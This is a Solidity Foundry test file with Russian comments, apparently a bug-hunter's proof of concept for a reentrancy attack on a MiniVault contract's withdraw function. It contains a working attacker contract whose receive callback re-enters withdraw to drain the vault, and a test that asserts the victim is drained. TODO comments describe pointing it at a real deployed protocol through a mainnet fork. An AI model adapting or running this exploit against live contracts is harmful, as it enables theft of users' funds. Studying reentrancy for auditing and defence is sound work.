// SPDX-License-Identifier: UNLICENSED
// PoC reentrancy — СИМВОЛЬНО ПОДТВЕРЖДЁН KLEE (SCSA).
// цель: MiniVault.withdraw (строка 12)
// witness-модель KLEE (входы, при которых путь кражи достижим):
//   balance >= 340282366920938463463374607431768211455 wei, msg.value = 340282366920938463463374607431768211455 wei, глубина реентрантности = 1
//   оракул: total_sent > исходный_баланс (нарушение checks-effects-interactions).
// TODO(hunter): для боевого протокола — форк жертвы и её конструктор (см. setUp).
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MiniVault} from "../src/MiniVault.sol";

// атакующий: реентрантно вызывает уязвимую функцию из callback,
// пока у жертвы остаются средства
contract MiniVaultAttacker {
    MiniVault public target;
    uint256 public constant STEP = 1 ether;

    constructor(MiniVault _target) {
        target = _target;
    }

    // точка входа атаки
    function attack() external payable {
        // депозит перед атакой (найден статически)
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // реентрантный callback: пока жертва платит — заходим снова
    receive() external payable {
        if (address(target).balance >= STEP) {
            target.withdraw();
        }
    }
}

contract MiniVaultReentrancyTest is Test {
    MiniVault victim;
    MiniVaultAttacker attacker;

    function setUp() public {
        // TODO(hunter): для реального протокола — vm.createSelectFork(RPC, block)
        //              и адрес развёрнутой жертвы вместо new
        victim = new MiniVault();
        vm.deal(address(victim), 10 ether);   // наполняем жертву
        attacker = new MiniVaultAttacker(victim);
    }

    function test_ReentrancyDrainsVictim() public {
        uint256 victimBefore   = address(victim).balance;
        uint256 attackerBefore = address(attacker).balance;

        attacker.attack{value: 1 ether}();

        // доказательство эксплойта: баланс жертвы упал, атакующего — вырос
        assertLt(address(victim).balance,   victimBefore,   "victim not drained");
        assertGt(address(attacker).balance, attackerBefore, "attacker did not profit");
    }
}
